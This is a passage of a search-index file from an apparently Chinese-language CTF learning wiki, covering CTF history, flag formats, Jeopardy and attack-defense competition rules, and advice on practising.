<li>CTFTime \u8bde\u751f\uff08\u5168\u7403 CTF \u6392\u540d\u5e73\u53f0\uff09</li> <li>\u4e16\u754c\u7ea7\u603b\u51b3\u8d5b DEFCON CTF \u6210\u4e3a\u201c\u9ed1\u5ba2\u4e16\u754c\u676f\u201d</li> <li>\u8d8a\u6765\u8d8a\u591a\u56fd\u5bb6\u5c06 CTF \u4f5c\u4e3a\u7f51\u5b89\u4eba\u624d\u4e3b\u8981\u57f9\u517b\u65b9\u5f0f</li> </ul>"},{"location":"basic/history/#\u4e2d\u56fd-ctf-\u7684\u5d1b\u8d772012\u73b0\u5728","title":"\u4e2d\u56fd CTF \u7684\u5d1b\u8d77\uff082012\u2013\u73b0\u5728\uff09","text":"<p>\u4e2d\u56fd CTF \u5728\u8fc7\u53bb\u5341\u5e74\u98de\u901f\u53d1\u5c55\u3002</p> <p>\u6807\u5fd7\u4e8b\u4ef6\uff1a</p> <ul> <li>2013\u20132016\uff1aXCTF \u8054\u76df\u6210\u7acb</li> <li>\u9ad8\u6821\u5b89\u5168\u6218\u961f\u6d8c\u73b0\uff1a</li> <li>0ops\uff08\u4e0a\u6d77\u4ea4\u901a\u5927\u5b66\uff09</li> <li>\u84dd\u83b2\u82b1\uff08Tsinghua\uff09</li> <li>AAA\uff08\u5317\u822a\uff09</li> <li>r3kapig\uff08\u56fd\u79d1\u5927+\u6d59\u5927\uff09</li> <li>XMan \u590f\u4ee4\u8425\uff08\u9762\u5411\u9752\u5c11\u5e74\uff09\u8bde\u751f</li> <li>WCTF\u3001\u767e\u5ea6\u676f\u3001\u5f3a\u7f51\u676f\u7b49\u5927\u578b\u8d5b\u4e8b\u767b\u573a</li> </ul> <p>\u56fd\u5185\u6218\u961f\u66f4\u662f\u5728 DEFCON CTF \u4e0a\u9891\u51fa\uff0c\u90e8\u5206\u6218\u961f\u4e5f\u593a\u5f97\u4e16\u754c\u51a0\u519b \u2014\u2014 \u521b\u4e0b\u5386\u53f2\u3002</p>"},{"location":"basic/history/#\u4e3a\u4f55-ctf-\u5982\u4eca\u5982\u6b64\u91cd\u8981","title":"\u4e3a\u4f55 CTF \u5982\u4eca\u5982\u6b64\u91cd\u8981\uff1f","text":"<p>CTF \u5982\u4eca\u88ab\u89c6\u4e3a \u7f51\u7edc\u5b89\u5168\u9886\u57df\u6700\u6838\u5fc3\u7684\u5b66\u4e60\u4f53\u7cfb\uff0c\u539f\u56e0\u5305\u62ec\uff1a</p> <ul> <li>\u4e0e\u771f\u5b9e\u573a\u666f\u9ad8\u5ea6\u8d34\u5408</li> <li>\u8bad\u7ec3\u6f0f\u6d1e\u5206\u6790\u3001\u9006\u5411\u3001\u653b\u9632\u3001\u5bc6\u7801\u5b66\u7b49\u6838\u5fc3\u6280\u672f</li> <li>\u9002\u5408\u9752\u5c11\u5e74\u5165\u95e8</li> <li>\u9ad8\u6821\u3001\u4f01\u4e1a\u3001\u56fd\u5bb6\u7ea7\u5e73\u53f0\u5168\u9762\u8ba4\u53ef</li> <li>\u4e16\u754c\u9876\u7ea7\u5b89\u5168\u56e2\u961f\u5927\u91cf\u4ece CTF \u4e2d\u6210\u957f</li> <li>\u6301\u7eed\u5f62\u6210\u793e\u533a\u3001\u6587\u5316\u3001\u751f\u6001</li> </ul> <p>\u5982\u4eca\uff1a</p> <p>\ud83d\udc49 CTF \u5df2\u7ecf\u4e0d\u53ea\u662f\u7ade\u8d5b\uff0c\u800c\u662f\u4e00\u5957\u7f51\u7edc\u5b89\u5168\u4e13\u4e1a\u4eba\u5458\u7684\u57f9\u517b\u4f53\u7cfb\u3002</p>"},{"location":"basic/intro/","title":"\u4ec0\u4e48\u662fCTF\uff1f","text":""},{"location":"basic/intro/#ctf\u7684\u4ecb\u7ecd","title":"CTF\u7684\u4ecb\u7ecd","text":"<p>CTF\uff08Capture The Flag\uff09\u4e2d\u6587\u53eb\u201c\u593a\u65d7\u8d5b\u201d\uff0c\u662f\u4e00\u79cd\u6a21\u62df\u771f\u5b9e\u7f51\u7edc\u653b\u9632\u573a\u666f\u7684\u7ade\u8d5b\u5f62\u5f0f\u3002  \u53c2\u8d5b\u8005\u901a\u8fc7\u5206\u6790\u3001\u9006\u5411\u3001\u7834\u89e3\u3001\u6784\u9020 payload\u3001\u53d1\u73b0\u6f0f\u6d1e\u7b49\u65b9\u5f0f\u6765\u201c\u593a\u53d6\u201d\u76ee\u6807\u7cfb\u7edf\u4e2d\u7684 Flag\uff08\u65d7\u5b50\uff09\uff0c\u4ee5\u6b64\u5f97\u5206\u3002\u5b83\u662f\u76ee\u524d\u5168\u4e16\u754c\u6700\u6d41\u884c\u7684 \u7f51\u7edc\u5b89\u5168\u6280\u672f\u7ade\u8d5b\u5f62\u5f0f\u3002</p> <p>\u6bd4\u8d5b\u4e2d\uff0c\u4e3b\u529e\u65b9\u4f1a\u5c06\u4e00\u4e2a\u7279\u5b9a\u7684\u5b57\u7b26\u4e32\u3001\u6587\u4ef6\u6216\u4ee3\u7801\u7247\u6bb5\uff08\u5373\u201cFlag\u201d\uff0c\u65d7\u5b50\uff09\u79d8\u5bc6\u5730\u9690\u85cf\u5728\u9884\u5148\u8bbe\u7f6e\u597d\u6f0f\u6d1e\u7684\u7cfb\u7edf\u3001\u7a0b\u5e8f\u6216\u7f51\u7ad9\u4e2d\u3002\u53c2\u8d5b\u961f\u4f0d\u9700\u8981\u8fd0\u7528\u4e13\u4e1a\u7684\u5b89\u5168\u77e5\u8bc6\u548c\u6280\u672f\uff0c\u901a\u8fc7\u89e3\u5bc6\u3001\u5206\u6790\u3001\u6e17\u900f\u7b49\u65b9\u5f0f\u627e\u5230\u8fd9\u4e2a\u201c\u65d7\u5b50\u201d\u5e76\u63d0\u4ea4\u7ed9\u88c1\u5224\u7cfb\u7edf\uff0c\u4ece\u800c\u5f97\u5206\u3002</p> <p>CTF \u6bd4\u8d5b\u4e0d\u4ec5\u8003\u9a8c\u9009\u624b\u7684\u4e2a\u4eba\u6280\u672f\u6c34\u5e73\uff0c\u4e5f\u5f3a\u8c03\u56e2\u961f\u5408\u4f5c\u3001\u4e34\u573a\u5e94\u53d8\u548c\u538b\u529b\u4e0b\u7684\u5feb\u901f\u5b66\u4e60\u80fd\u529b\u3002</p>"},{"location":"basic/intro/#\u65d7\u5b50\u662f\u4ec0\u4e48","title":"\u65d7\u5b50\u662f\u4ec0\u4e48\uff1f","text":"<p>Flag \u662f\u4e00\u4e2a\u201c\u9690\u85cf\u7684\u79d8\u5bc6\u5b57\u7b26\u4e32\u201d\uff0c\u901a\u5e38\u5f62\u5982\uff1a</p> <pre><code>flag{S0m3_RanD0m_Str1nG}\n</code></pre> <p>\u5f53\u4f60\u6210\u529f\u5229\u7528\u6f0f\u6d1e\u3001\u89e3\u5bc6\u7b97\u6cd5\u6216\u9006\u5411\u7a0b\u5e8f\u540e\uff0c\u5c31\u80fd\u4ece\u7cfb\u7edf\u4e2d\u62ff\u5230\u8fd9\u4e2a\u5b57\u7b26\u4e32\uff0c\u8fd9\u8868\u793a\uff1a</p> <p>\u2714 \u4f60\u6210\u529f\u7a81\u7834\u4e86\u9898\u76ee\u7684\u5b89\u5168\u9632\u62a4</p> <p>\u2714 \u4f60\u5b8c\u6210\u4e86\u6311\u6218</p> <p>\u2714 \u4f60\u83b7\u5f97\u4e86\u5f97\u5206</p>"},{"location":"basic/intro/#ctf-\u6709\u54ea\u4e9b\u6bd4\u8d5b\u5f62\u5f0f","title":"CTF \u6709\u54ea\u4e9b\u6bd4\u8d5b\u5f62\u5f0f\uff1f","text":""},{"location":"basic/intro/#jeopardy\u89e3\u9898\u8d5b","title":"Jeopardy\uff08\u89e3\u9898\u8d5b\uff09","text":"<p>\u89e3\u9898\u6a21\u5f0f\uff08Jeopardy\uff09\u5e38\u89c1\u4e8e\u7ebf\u4e0a\u9009\u62d4\u6bd4\u8d5b\u3002\u5728\u89e3\u9898\u6a21\u5f0f CTF \u8d5b\u5236\u4e2d\uff0c\u53c2\u8d5b\u961f\u4f0d\u53ef\u4ee5\u901a\u8fc7\u4e92\u8054\u7f51\u6216\u73b0\u573a\u7f51\u7edc\u53c2\u4e0e\uff0c\u901a\u8fc7\u4e0e\u5728\u7ebf\u73af\u5883\u4ea4\u4e92\u6216\u5bf9\u9898\u76ee\u6587\u4ef6\u8fdb\u884c\u79bb\u7ebf\u5206\u6790\uff0c\u89e3\u51b3\u7f51\u7edc\u5b89\u5168\u6280\u672f\u6311\u6218\u5e76\u83b7\u53d6\u76f8\u5e94\u5206\u503c\u3002</p> <p>\u8fd9\u79cd\u6a21\u5f0f\u7c7b\u4f3c\u4e8e ACM \u7f16\u7a0b\u7ade\u8d5b \u6216 \u4fe1\u606f\u5b66\u5965\u6797\u5339\u514b\u7ade\u8d5b\uff0c\u6839\u636e \u603b\u5206\u4e0e\u89e3\u9898\u65f6\u95f4 \u6765\u6392\u540d\u3002</p> <p>\u7b80\u5355\u5730\u8bf4\u5c31\u662f\uff0c\u6bcf\u9053\u9898\u72ec\u7acb\u89e3\u9898 \u2192 \u62ff\u5230 Flag \u2192 \u5f97\u5206\u3002</p>"},{"location":"basic/intro/#-\u4e00\u8840--\u4e8c\u8840--\u4e09\u8840first-blood-\u7cfb\u7edf","title":"\ud83e\ude78 \u4e00\u8840 / \u4e8c\u8840 / \u4e09\u8840\uff08First Blood \u7cfb\u7edf\uff09","text":"<p>\u89e3\u9898\u6a21\u5f0f\u4e0b\u901a\u5e38\u4f1a\u8bbe\u7f6e\uff1a</p> <ul> <li>\u4e00\u8840\uff08First Blood\uff09</li> <li>\u4e8c\u8840\uff08Second Blood\uff09</li> <li>\u4e09\u8840\uff08Third Blood\uff09</li> </ul> <p>\u5373\u6700\u5148\u89e3\u51fa\u8be5\u9898\u76ee\u7684\u4e09\u652f\u961f\u4f0d\u4f1a\u83b7\u5f97\u989d\u5916\u79ef\u5206\uff0c\u7528\u4e8e\u9f13\u52b1\u5feb\u901f\u4e14\u51c6\u786e\u7684\u89e3\u9898\u80fd\u529b\u3002\u8fd9\u4e5f\u662f\u56e2\u961f\u6574\u4f53\u5b9e\u529b\u7684\u4f53\u73b0\u3002</p>"},{"location":"basic/intro/#-\u964d\u5206\u673a\u5236\u52a8\u6001\u5206\u503c","title":"\ud83d\udcc9 \u964d\u5206\u673a\u5236\uff08\u52a8\u6001\u5206\u503c\uff09","text":"<p>\u4e00\u4e9b\u6bd4\u8d5b\u91c7\u7528\u6240\u8c13\u7684 \u964d\u5206\u673a\u5236\uff08Dynamic Score\uff09\uff1a</p> <ul> <li>\u9898\u76ee\u521a\u53d1\u5e03\u65f6\u5177\u6709\u8f83\u9ad8\u521d\u59cb\u5206</li> <li>\u968f\u7740\u89e3\u51fa\u8be5\u9898\u7684\u961f\u4f0d\u53d8\u591a</li> <li>\u9898\u76ee\u5206\u503c\u9010\u6e10\u4e0b\u964d</li> <li>\u6700\u7ec8\u4e0b\u964d\u5230\u4e00\u4e2a\u6700\u4f4e\u4fdd\u5e95\u5206</li> </ul> <p>\u8fd9\u4f7f\u5f97\u9898\u76ee\u96be\u5ea6\u4e0e\u5f97\u5206\u66f4\u52a0\u5e73\u8861\uff0c\u4e5f\u589e\u52a0\u4e86\u6bd4\u8d5b\u7684\u7b56\u7565\u6027\u3002</p>"},{"location":"basic/intro/#jeopardy-\u9898\u76ee\u4e3b\u8981\u7c7b\u522b","title":"\ud83d\udcdaJeopardy \u9898\u76ee\u4e3b\u8981\u7c7b\u522b","text":"<p>\u76ee\u524d CTF \u89e3\u9898\u6a21\u5f0f\u4e3b\u8981\u5305\u542b 8 \u5927\u7c7b\u522b\uff1a</p> <ul> <li>Web \u2014 \u7f51\u7ad9\u4e0e\u7f51\u7edc\u653b\u9632</li> <li>Reverse \u2014 \u7a0b\u5e8f\u9006\u5411\u5206\u6790</li> <li>Pwn \u2014 \u4e8c\u8fdb\u5236\u6f0f\u6d1e\u5229\u7528</li> <li>Crypto \u2014 \u5bc6\u7801\u5b66\u653b\u51fb</li> <li>Mobile \u2014 \u79fb\u52a8\u5b89\u5168</li> <li>Misc \u2014 \u5176\u4ed6\u6742\u9879\u5b89\u5168\u6311\u6218\uff08\u9690\u5199\u3001\u53d6\u8bc1\u3001\u5947\u602a\u9898\u578b\u7b49\uff09</li> <li>IOT \u2014 \u7269\u8054\u7f51\u65b9\u5411\u6311\u6218</li> <li>Osint \u2014 \u5f00\u6e90\u60c5\u62a5\u65b9\u5411\u6311\u6218</li> </ul>"},{"location":"basic/intro/#awd\u653b\u9632\u5bf9\u6297-attack--defense","title":"AWD\uff08\u653b\u9632\u5bf9\u6297  Attack &amp; Defense\uff09","text":"<p>\u653b\u9632\u8d5b\u5e38\u89c1\u4e8e \u7ebf\u4e0b\u51b3\u8d5b\uff0c\u6a21\u5f0f\u771f\u5b9e\u3001\u6fc0\u70c8\u3001\u8282\u594f\u5feb\u3002</p> <p>\u6240\u6709\u53c2\u8d5b\u961f\u4f0d\u4f1a\u83b7\u5f97\u4e00\u5957\u76f8\u540c\u7684\u7cfb\u7edf\u73af\u5883\uff0c\u901a\u5e38\u79f0\u4e3a\uff1a<code>gamebox</code>\uff08\u9776\u673a\uff09\uff0c\u6bcf\u4e2a Gamebox \u4e0a\u8fd0\u884c\u591a\u4e2a\u5e26\u6f0f\u6d1e\u7684\u670d\u52a1\u3002</p> <p></p> <p>\u53c2\u8d5b\u961f\u4f0d\u5fc5\u987b\uff1a</p> <ul> <li>\u653b\u51fb\u522b\u4eba \u2192 \u62ff Flag \u5f97\u5206</li> <li>\u4fee\u8865\u81ea\u5df1 \u2192 \u9632\u6b62\u4e22\u5206</li> </ul> <p>\u653b\u9632\u8d5b\u540c\u65f6\u6bd4\u62fc\uff1a</p> <ul> <li>\u6f0f\u6d1e\u6316\u6398\u80fd\u529b</li> <li>\u5b9e\u65f6\u9632\u5fa1\u80fd\u529b</li> <li>\u56e2\u961f\u534f\u4f5c</li> </ul> <p>\u56e2\u961f\u4e4b\u95f4\u4e92\u76f8\u653b\u9632\uff0c\u4e00\u8fb9\u4fee\u6f0f\u6d1e\u3001\u4e00\u8fb9\u653b\u51fb\u5176\u4ed6\u961f\u4f0d\u3002\uff08\u53c2\u8d5b\u9009\u624b\u65e2\u662f\u4e00\u4e2ahacker\uff0c\u53c8\u662f\u4e00\u4e2amanager\uff09</p> <p>\u4e00\u822c\u60c5\u51b5\u4e0b\uff0c\u4e3b\u529e\u65b9\u4f1a\u63d0\u4f9b\u7f51\u7ebf\uff0c\u4f46\u5e76\u4e0d\u4f1a\u63d0\u4f9b\u7f51\u7ebf\u8f6c\u63a5\u53e3\uff0c\u5bf9\u4e8e\u90e8\u5206\u4f7f\u7528\u6ca1\u6709 RJ45 \u7f51\u53e3\u7684\u7b14\u8bb0\u672c\u8bbe\u5907\u7684\u9009\u624b\u800c\u8a00\uff0c\u5176\u901a\u5e38\u9700\u8981\u81ea\u884c\u51c6\u5907\u8f6c\u6362\u5668\u3002</p>"},{"location":"basic/intro/#attack--defense-\u57fa\u672c\u89c4\u5219","title":"Attack &amp; Defense \u57fa\u672c\u89c4\u5219","text":"<ul> <li>\u6218\u961f\u521d\u59cb\u5206\u6570\u5747\u4e3a\u6307\u503c\u5206\u3002</li> <li>\u6bd4\u8d5b\u4ee5\u6307\u5b9a\u65f6\u95f4\u6bb5\uff08\u901a\u5e38\u4e3a 5/10 \u5206\u949f\uff09\u4e3a\u4e00\u4e2a\u56de\u5408\uff0c\u6bcf\u56de\u5408\u4e3b\u529e\u65b9\u4f1a\u66f4\u65b0\u5df2\u653e\u51fa\u670d\u52a1\u7684 Flag\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u4e00\u4e2a\u6218\u961f\u7684\u4e00\u4e2a\u670d\u52a1\u88ab\u6e17\u900f\u653b\u51fb\u6210\u529f\uff08\u88ab\u62ff Flag \u5e76\u63d0\u4ea4\uff09\uff0c\u5219\u6263\u9664\u4e00\u5b9a\u5206\u6570\uff0c\u653b\u51fb\u6210\u529f\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u6570\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u5982\u679c\u6218\u961f\u80fd\u591f\u7ef4\u62a4\u81ea\u5df1\u7684\u670d\u52a1\u6b63\u5e38\u8fd0\u884c\uff0c\u5219\u5206\u6570\u4e0d\u4f1a\u51cf\u5c11\uff08\u5982\u679c\u9632\u5fa1\u6210\u529f\u52a0\u5206\u5219\u4f1a\u52a0\u5206\uff09\u3002</li> <li>\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u5b95\u673a\u6216\u5f02\u5e38\u65e0\u6cd5\u901a\u8fc7\u6d4b\u8bd5\uff0c\u5219\u53ef\u80fd\u4f1a\u6263\u5206\uff0c\u670d\u52a1\u6b63\u5e38\u7684\u6218\u961f\u5e73\u5206\u8fd9\u4e9b\u5206\u3002\u5f80\u5f80\u670d\u52a1\u5f02\u5e38\u4f1a\u6263\u9664\u8f83\u591a\u7684\u5206\u6570\u3002</li> <li>\u5982\u679c\u8be5\u56de\u5408\u5185\u6240\u6709\u6218\u961f\u7684\u670d\u52a1\u90fd\u5f02\u5e38\uff0c\u5219\u8ba4\u4e3a\u662f\u4e0d\u53ef\u6297\u62d2\u56e0\u7d20\u9020\u6210\uff0c\u5206\u6570\u90fd\u4e0d\u51cf\u5c11\u3002</li> <li>\u6bcf\u56de\u5408\u5185\uff0c\u670d\u52a1\u5f02\u5e38\u548c\u88ab\u62ff Flag \u53ef\u4ee5\u540c\u65f6\u53d1\u751f\uff0c\u5373\u6218\u961f\u5728\u4e00\u4e2a\u56de\u5408\u5185\u5355\u4e2a\u670d\u52a1\u53ef\u80fd\u4f1a\u6263\u9664\u4e24\u8005\u53e0\u52a0\u7684\u5206\u6570\u3002</li> <li>\u7981\u6b62\u961f\u4f0d\u4f7f\u7528\u901a\u7528\u9632\u5fa1\u65b9\u6cd5\u3002</li> <li>\u8bf7\u53c2\u8d5b\u961f\u4f0d\u5728\u6bd4\u8d5b\u5f00\u59cb\u65f6\u5bf9\u6240\u6709\u670d\u52a1\u8fdb\u884c\u5907\u4efd\uff0c\u82e5\u56e0\u81ea\u8eab\u539f\u56e0\u5bfc\u81f4\u670d\u52a1\u6c38\u4e45\u635f\u574f\u6216\u4e22\u5931\uff0c\u65e0\u6cd5\u6062\u590d\uff0c\u4e3b\u529e\u65b9\u4e0d\u63d0\u4f9b\u91cd\u7f6e\u670d\u52a1\u3002</li> <li>\u7981\u6b62\u5bf9\u8d5b\u9898\u4ee5\u5916\u7684\u6bd4\u8d5b\u5e73\u53f0\u53d1\u8d77\u653b\u51fb\uff0c\u5305\u62ec\u4f46\u4e0d\u9650\u4e8e\u5728 gamebox \u63d0\u6743 root\u3001\u5229\u7528\u4e3b\u529e\u65b9\u5e73\u53f0\u6f0f\u6d1e\u7b49\uff0c\u8fdd\u89c4\u8005\u7acb\u523b\u88ab\u53d6\u6d88\u53c2\u8d5b\u8d44\u683c\u3002</li> </ul>"},{"location":"basic/intro/#\u7f51\u7edc\u73af\u5883","title":"\u7f51\u7edc\u73af\u5883","text":"<p>\u4e00\u822cAWD\u6bd4\u8d5b\u5728\u5f00\u59cb\u524d\u4f1a\u7ed9\u9009\u624b\u540c\u6b65\u6587\u6863\uff0c\u4f60\u9700\u8981\u6839\u636e\u4e3b\u529e\u65b9\u63d0\u4f9b\u7684\u6587\u6863\u719f\u6089\u73af\u5883\uff0c\u6587\u6863\u4e0a\u4e00\u822c\u90fd\u4f1a\u6709\u6bd4\u8d5b\u73af\u5883\u7684 \u7f51\u7edc\u62d3\u6251\u56fe \uff08\u5982\u4e0b\u56fe\uff09\uff0c\u6bcf\u652f\u961f\u4f0d\u4f1a\u7ef4\u62a4\u82e5\u5e72\u7684 Gamebox\uff08\u5df1\u65b9\u670d\u52a1\u5668\uff09 \uff0cGamebox \u4e0a\u90e8\u7f72\u6709\u5b58\u5728\u6f0f\u6d1e\u7684\u670d\u52a1\u3002</p>"},{"location":"basic/intro/#\u62d3\u6251\u7ed3\u67841","title":"\u62d3\u6251\u7ed3\u67841","text":""},{"location":"basic/intro/#\u62d3\u6251\u7ed3\u67842","title":"\u62d3\u6251\u7ed3\u67842","text":""},{"location":"basic/intro/#\u62d3\u6251\u7ed3\u67843","title":"\u62d3\u6251\u7ed3\u67843","text":""},{"location":"basic/intro/#\u62d3\u6251\u7ed3\u67844","title":"\u62d3\u6251\u7ed3\u67844","text":""},{"location":"basic/practice/","title":"\u7ec3\u4e60CTF","text":""},{"location":"basic/practice/#\u5982\u4f55\u5b66\u597dctf","title":"\u5982\u4f55\u5b66\u597dCTF\uff1f","text":"<p>\u540d\u8a00\u8b66\u53e5</p> <p>\u5b66\u5982\u9006\u6c34\u884c\u821f\uff0c\u4e0d\u8fdb\u5219\u9000\u3002</p> <p>\u5b66\u4e60 CTF \u5e76\u4e0d\u96be\uff0c\u4f46\u771f\u6b63\u60f3\u5b66\u597d\u5374\u5f88\u4e0d\u5bb9\u6613\u3002\u6216\u8bb8\u5f53\u4f60\u9010\u6e10\u6df1\u5165\u8fd9\u4e2a\u5708\u5b50\uff0c\u4f60\u4f1a\u53d1\u73b0\u8eab\u8fb9\u7684\u4eba\u591a\u5c11\u90fd\u77e5\u9053 CTF \u662f\u4ec0\u4e48\u3002\u6709\u4eba\u5728\u67d0\u4e2a\u65b9\u5411\u91cc\u94bb\u7814\u5f97\u5f88\u6df1\uff0c\u4e5f\u6709\u4eba\u5404\u4e2a\u65b9\u5411\u90fd\u7565\u77e5\u4e00\u4e8c\uff0c\u5374\u59cb\u7ec8\u96be\u4ee5\u505a\u5230\u7cbe\u901a\u3002\u771f\u6b63\u80fd\u5728\u591a\u4e2a\u9886\u57df\u4e2d\u6e38\u5203\u6709\u4f59\u3001\u88ab\u79f0\u4e3a\u201c\u5168\u6808\u201d\u7684\u4eba\uff0c\u59cb\u7ec8\u53ea\u662f\u6781\u5c11\u6570\u3002</p> <p>\u5b9e\u9645\u4e0a\uff0cCTF \u6d89\u53ca\u7684\u77e5\u8bc6\u9762\u6781\u5e7f\uff1a\u4eceMisc\u3001Re\u3001PWN\u3001Web\u5230Crypto\uff0c\u6bcf\u4e00\u4e2a\u65b9\u5411\u90fd\u50cf\u662f\u4e00\u7247\u72ec\u7acb\u7684\u6d77\u6d0b\u3002\u60f3\u8981\u6210\u4e3a\u9ad8\u624b\uff0c\u5c31\u5fc5\u987b\u4e0d\u65ad\u5728\u4e0d\u540c\u7684\u9886\u57df\u4e2d\u63a2\u7d22\u3001\u8bd5\u9519\u3001\u79ef\u7d2f\u3002\u66f4\u591a\u65f6\u5019\uff0c\u4f60\u4f1a\u53d1\u73b0\u638c\u63e1\u6280\u80fd\u4e0d\u662f\u6700\u96be\u7684\uff0c\u96be\u7684\u662f\u575a\u6301\u5b66\u4e60\u7684\u8010\u5fc3\u3001\u9762\u5bf9\u5931\u8d25\u7684\u52c7\u6c14\uff0c\u4ee5\u53ca\u4e0d\u65ad\u7a81\u7834\u81ea\u6211\u7684\u51b3\u5fc3\u3002</p> <p>\u4f46\u6b63\u662f\u8fd9\u79cd\u4e0d\u65ad\u6311\u6218\u672a\u77e5\u7684\u8fc7\u7a0b\uff0c\u8ba9 CTF \u5145\u6ee1\u9b45\u529b\u3002\u6bcf\u6b21\u505a\u51fa\u4e00\u9053\u9898\u3001\u653b\u514b\u4e00\u4e2a\u6f0f\u6d1e\uff0c\u4f60\u90fd\u4f1a\u611f\u53d7\u5230\u6210\u957f\u7684\u559c\u60a6\u3002\u4e5f\u8bb8\u4f60\u4e0d\u4e00\u5b9a\u8981\u6210\u4e3a\u201c\u5168\u6808\u5927\u4f6c\u201d\uff0c\u56e0\u4e3a\u56e2\u961f\u7684\u529b\u91cf\u6709\u65f6\u5019\u66f4\u4e3a\u5f3a\u5927\uff0c\u4f46\u53ea\u8981\u4f60\u613f\u610f\u4fdd\u6301\u70ed\u60c5\u3001\u6301\u7eed\u6df1\u5165\uff0c\u603b\u6709\u4e00\u5929\u4f1a\u5728\u5c5e\u4e8e\u4f60\u7684\u9886\u57df\u91cc\u53d1\u5149\u3002</p> <p>\u6211\u66fe\u7ecf\u4e5f\u662f\u8fd9\u6837\uff0c\u662f\u4e00\u4e2a\u5404\u4e2a\u65b9\u5411\u7565\u77e5\u4e00\u4e8c\u4f46\u8fbe\u4e0d\u5230\u7cbe\u901a\u7684\u4eba\uff0c\u6240\u4ee5\u6211\u53d1\u81ea\u5185\u5fc3\u7684\u60f3\u53bb\u505a\u597d\u6211\u4eec\u5f53\u524d\u8fd9\u4e2a\u9879\u76ee\uff0c\u80fd\u591f\u5e2e\u52a9\u6211<code>\u543e\u65e5\u4e09\u7701\u543e\u8eab</code>\uff0c\u80fd\u591f\u5c06\u5b66\u4f1a\u7684\u77e5\u8bc6\u70b9\u8bb0\u5f55\u4e0b\u6765\uff0c\u4e0d\u4f1a\u7684\u77e5\u8bc6\u70b9\u53bb\u94bb\u7814\u8fdb\u53bb\uff0c\u4e0d\u61c2\u7684\u6280\u672f\u5b66\u4e60\u6210\u4e3a\u81ea\u5df1\u7684\u6280\u672f\u3002</p> <p></p> <p>\u7f16\u8005\u5bc4\u8bed</p> <p>\u6211\u4eec\u5df2\u7ecf\u6709\u4e86\u73b0\u6709\u7684CTF\u7ec3\u4e60\u5e73\u53f0\uff0c\u4f46\u662f\u5f88\u591a\u5c0f\u4f19\u4f34\u90fd\u53cd\u9988\u8bf4\u627e\u4e0d\u5230\u4e00\u4e2a\u5408\u9002\u7684\u5b66\u4e60\u6210\u957f\u8def\u7ebf\uff0c\u6211\u7684\u60f3\u6cd5\u6bd4\u8f83\u7b80\u5355\uff0c\u4f9d\u6258\u73b0\u6709\u7684\u7ec3\u4e60\u5e73\u53f0\u3001\u9776\u573a\u3001\u793e\u533a\uff0c\u878d\u6c47\u8d2f\u901a\u5f53\u524d\u6587\u5e93\u7684\u77e5\u8bc6\u4f53\u7cfb\uff0c\u5c06\u77e5\u8bc6\u4f53\u7cfb\u518d\u5f52\u7eb3\u5230\u9898\u76ee\u8fdb\u884c\u95ed\u73af\u3002\u8fd9\u6837\u5927\u5bb6\u5728\u770b\u6587\u6863\u5b66\u4e60\u77e5\u8bc6\u6280\u672f\u6216\u8005\u770b\u76f8\u5173\u89c6\u9891\u5b66\u4e60\u6280\u672f\u77e5\u8bc6\u7684\u65f6\u5019\u6709\u9898\u53ef\u7ec3\uff0c\u6709\u793e\u533a\u53ef\u8ba8\u8bba\u3002</p> <p>\u5f53\u7136\u7ecf\u8fc72018\u5e74\u5230\u73b0\u5728\uff0c\u5f88\u591a\u5e08\u5085\u4e5f\u968f\u7740\u9752\u5c11\u5e74CTF\uff08\u4e2d\u5b66\u751fCTF\uff09\u5df2\u7ecf\u5230\u4e86\u5de5\u4f5c\u517b\u5bb6\u7684\u5730\u6b65\u4e86\uff0c\u4f46\u662f\u5927\u90e8\u5206\u5e08\u5085\u4eec\u90fd\u8fd8\u662f\u4fdd\u7559\u7740\u6253CTF\u7684\u4e60\u60ef\uff0c\u559c\u6b22CTF\u7684\u6c1b\u56f4\u548c\u4e50\u8da3\uff0c\u6211\u4eec\u4e5f\u6b22\u8fce\u5404\u4f4d\u5e08\u5085\u4e00\u8d77\u5171\u540c\u5171\u5efa\u6211\u4eec\u7684\u6587\u5e93\uff0c\u8fd9\u4e5f\u662f\u4e3a\u4ec0\u4e48\u6211\u4eec\u5e95\u90e8\u7248\u6743\u7559\u4e0b\u4e86\u201c\u793e\u533a\u9a71\u52a8\u201d\u8fd9\u6837\u7684\u5173\u952e\u5185\u5bb9\u3002</p> <p></p> <p>\u4e0a\u56fe\u4e2d\uff0c\u6700\u65e9\u8def\u7ebf\u662f\u7eff\u8272\u56fe\u7247\uff08\u9752\u5c11\u5e74CTF\u65e9\u671f\u7248\u672c\uff09\u73b0\u5982\u4eca\u7248\u672c\u4e3a\u84dd\u8272\u8def\u7ebf\u3002</p> <ol> <li>\u4ece\u300c\u6587\u5e93\u300d\u5f00\u59cb\u5b66\u4e60</li> <li>\u6216\u8fdb\u5165\u300c\u5b66\u4e60\u5e73\u53f0\u300d\u89c2\u770b\u89c6\u9891\u6216\u9605\u8bfb\u6587\u7ae0</li> <li>\u524d\u5f80\u300c\u7ec3\u4e60\u5e73\u53f0\u300d\u6216\u300c\u9776\u573a\u300d\u505a\u76f8\u5173\u9898\u76ee</li> <li>\u9047\u5230\u96be\u9898\uff1f\u4e0a\u300c\u793e\u533a/\u793e\u7fa4\u300d\u6c42\u52a9</li> <li>\u56de\u5230\u300c\u6587\u5e93\u300d\u8865\u5145\u77e5\u8bc6\u6216\u63d0\u4ea4\u6539\u8fdb\u5efa\u8bae</li> <li>\u5faa\u73af\u5f80\u590d\uff0c\u6301\u7eed\u6210\u957f</li> </ol>"},{"location":"basic/practice/#ctf\u7ec3\u4e60\u5e73\u53f0\u63a8\u8350","title":"CTF\u7ec3\u4e60\u5e73\u53f0\u63a8\u8350","text":"<p>\u6ce8\u610f</p> <p>\u4ee5\u4e0b\u6392\u540d\u4e0d\u5206\u5148\u540e</p> <p>\u7b49\u5f85\u66f4\u65b0</p>"}]}